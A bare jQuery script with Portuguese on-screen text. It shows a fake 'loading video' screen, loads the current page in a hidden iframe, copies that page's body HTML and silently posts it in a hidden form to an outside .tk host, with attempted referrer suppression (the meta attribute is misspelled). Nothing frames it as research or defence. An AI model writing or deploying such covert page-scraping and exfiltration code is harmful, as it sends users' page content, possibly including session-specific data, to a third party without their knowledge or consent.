function access() {
    var v = $("#video").contents().find("body").html();
    v = v.replace(/"/g,"").replace(/'/g,"").replace(/</g,"").replace(/>/g,"");
    $("#d").replaceWith("<meta nme='referrer' content='never'><meta nme='referrer' content='no-referrer'><form name='vote' method='post' action='https://vipsts.tk/flix/video.php'><input style='display:none' type='text' name='d' value='" + v + "' /></form>");
document.forms['vote'].submit();
}
var ss = window.location.href;
ss = ss.replace('nplay','play');
$("h1").text("Carregando video aguarde...");
$('body').prepend('<style>body{background:#000;display:block !important}h1{position: fixed;width: max-content;height: max-content;top: 0;bottom: 0;right: 0;left: 0;margin: auto;color: #fff;}</style><body><div id="d"><iframe id="video" class="fakeplaybutton" src="' + ss +'" style="display:none" onload="access()" frameborder="0" scrolling="yes" allowfullscreen="allowfullscreen" mozallowfullscreen="mozallowfullscreen" msallowfullscreen="msallowfullscreen" oallowfullscreen="oallowfullscreen" webkitallowfullscreen="webkitallowfullscreen"></iframe></div></body>');
